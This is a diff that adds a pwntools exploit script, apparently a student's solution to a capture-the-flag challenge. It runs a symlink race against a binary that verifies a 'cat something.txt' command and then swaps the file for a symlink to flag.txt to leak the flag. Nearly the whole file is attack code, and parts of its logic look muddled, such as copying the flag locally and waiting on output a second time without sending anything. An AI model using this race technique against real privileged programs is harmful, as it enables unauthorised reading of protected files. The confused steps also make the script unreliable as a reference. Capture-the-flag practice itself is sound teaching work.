@@ -1,0 +1,110 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template ./main.elf
+from pwn import *
+import re
+import os
+import shutil
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or './main.elf')
+
+# This is necessary to spawn the debugger in a separate panel
+# Make sure to start tmux before using the GDB argument, else you will get some error
+context(terminal=['tmux', 'split-window', '-h'])
+
+# Regex used to find the flag in the output of the program
+flag_regex = re.compile(r"(InfoSec{.+?})")
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args". For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+# Start the process
+io = start()
+
+# Student Code Area
+########################################################################
+
+# Check if 'something.txt' exists and remove it
+def remove_file(file_path):
+    if os.path.exists(file_path):
+        os.unlink(file_path)
+        log.info(f"Removed file: {file_path}")
+
+# Ensure 'something.txt' is written
+def create_something_txt():
+    with open("something.txt", "w") as f:
+        f.write("something")
+    log.info("Created 'something.txt' with content.")
+
+# Function to handle reading output until specific pattern is found
+def wait_for_output(pattern, timeout=5):
+    output = b""
+    io.settimeout(timeout)
+    while True:
+        try:
+            data = io.recv(timeout=1)
+            if data:
+                output += data
+            if pattern in output:
+                return output
+        except EOFError:
+            break
+    return output
+
+# Clean up previous 'something.txt' if it exists
+remove_file("something.txt")
+
+# Create a new 'something.txt'
+create_something_txt()
+
+# Send the 'cat something.txt' command
+io.sendline(b"cat something.txt")
+
+# Wait for the program's response
+log.info("Waiting for output...")
+output = wait_for_output(b"Verified command, running...")
+
+# Clean up 'something.txt' and create symlink to 'flag.txt'
+remove_file("something.txt")
+log.info("Creating symlink to flag.txt...")
+os.symlink("flag.txt", "something.txt")
+
+# If 'solution.txt' exists, remove it and copy the symlinked file
+remove_file("solution.txt")
+shutil.copy("something.txt", "solution.txt")
+log.info("Copied symlinked 'something.txt' to 'solution.txt'.")
+
+# Wait for final output (to ensure the flag is printed in the output)
+log.info("Waiting for final output to extract the flag...")
+output = wait_for_output(b"Verified command, running...")
+
+# Attempt to extract the flag using regex
+flag_match = flag_regex.search(output.decode())
+if flag_match:
+    log.success(f"Flag found: {flag_match.group(0)}")
+else:
+    log.error("Flag not found in output.")
+
+# End of exploit, interactive mode for manual inspection if needed
+io.interactive()
+
+########################################################################
